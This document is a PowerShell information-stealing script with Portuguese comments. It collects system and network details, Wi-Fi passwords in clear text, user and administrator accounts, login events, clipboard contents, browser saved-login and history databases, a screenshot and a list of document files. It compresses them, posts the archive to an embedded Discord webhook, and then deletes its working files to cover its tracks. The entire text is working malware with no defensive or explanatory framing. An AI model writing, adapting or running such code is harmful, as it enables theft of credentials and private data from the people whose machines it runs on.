# KIT v2.2 – 10 MB max, sem admin
$hook="https://discord.com/api/webhooks/1458595316336037923/LcenEw4uom3H_-llTphqVq0Rr2uLqyFwSAk3HJ7E1UCWoCEL-wJ1Qp4HDcHdlSH7vYkV"
$kit="$env:TEMP\k"; New-Item $kit -Force -ItemType Directory |Out-Null

# 1) TXT leves
systeminfo |Out-File $kit\sys.txt -Encoding UTF8
'---HW---' |Out-File $kit\hw.txt -Encoding UTF8
Get-CimInstance Win32_ComputerSystem,Win32_Processor,Win32_BIOS |Out-File $kit\hw.txt -Append -Encoding UTF8
Get-NetIPConfiguration |Out-File $kit\net.txt -Encoding UTF8
netsh wlan export profile key=clear folder=$kit |Out-Null
Get-CimInstance Win32_UserAccount |Out-File $kit\usr.txt -Encoding UTF8
net localgroup administradores |Out-File $kit\adm.txt -Encoding UTF8
Get-WinEvent -FilterHashtable @{LogName='Security';ID=4624} -Max 100 -EA 0|Select TimeCreated,Message |Out-File $kit\log.txt -Encoding UTF8
Get-Clipboard |Out-File $kit\clip.txt -Encoding UTF8
dir $env:APPDATA\Microsoft\Windows\Recent -Name |Out-File $kit\rec.txt -Encoding UTF8

# 2) Navegadores – só 1 arquivo de cada tipo
@('Login Data','History','logins.json')|%{
  gci $env:LOCALAPPDATA,$env:APPDATA -R -Fi $_ -EA 0|select -First 1|%{cp $_ "$kit\$($_.Name)"}
}

# 3) Certificados (texto curto)
Get-ChildItem Cert:\CurrentUser\My|Select Subject,Thumbprint,NotAfter |Out-File $kit\certs.txt -Encoding UTF8

# 4) Screenshot 800×600 JPG 60% qualidade
Add-Type -AssemblyName System.Windows.Forms,System.Drawing
$screen=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds
$bmp=New-Object System.Drawing.Bitmap(800,600)
$g=[System.Drawing.Graphics]::FromImage($bmp)
$g.DrawImage([System.Drawing.Bitmap]::FromScreen(0,0,800,600),0,0,800,600)
$encoder=[System.Drawing.Imaging.ImageCodecInfo]::GetImageEncoders()[1]
$encParams=New-Object System.Drawing.Imaging.EncoderParameters(1)
$encParams.Param[0]=New-Object System.Drawing.Imaging.EncoderParameter([System.Drawing.Imaging.Encoder]::Quality,60)
$bmp.Save("$kit\ss.jpg",$encoder,$encParams)
$g.Dispose(); $bmp.Dispose()

# 5) Top 100 arquivos úteis (≤ 2 MB csv)
$ext=@('*.pdf','*.doc*','*.xls*','*.txt','*.csv','*.db','*.sqlite','*.pst')
Get-ChildItem C:\ -Include $ext -Recurse -Depth 2 -EA 0|select FullName,Length,LastWriteTime|sort Length -Descending|select -First 100|Export-Csv "$kit\t.csv" -NoTypeInformation

# 6) Compacta com limite 10 MB
Compress-Archive $kit "$kit.zip" -CompressionLevel Optimal
if((gi "$kit.zip").Length -gt 10MB){
  # remove screenshot pesado
  ri "$kit\ss.jpg"
  Compress-Archive -Update -Path $kit -DestinationPath "$kit.zip" -CompressionLevel Optimal
}

# 7) Envia
Invoke-RestMethod $hook -Method Post -InFile "$kit.zip" -ContentType 'application/zip'

# 8) Limpa
ri $kit -Recurse -Force; ri "$kit.zip" -Force
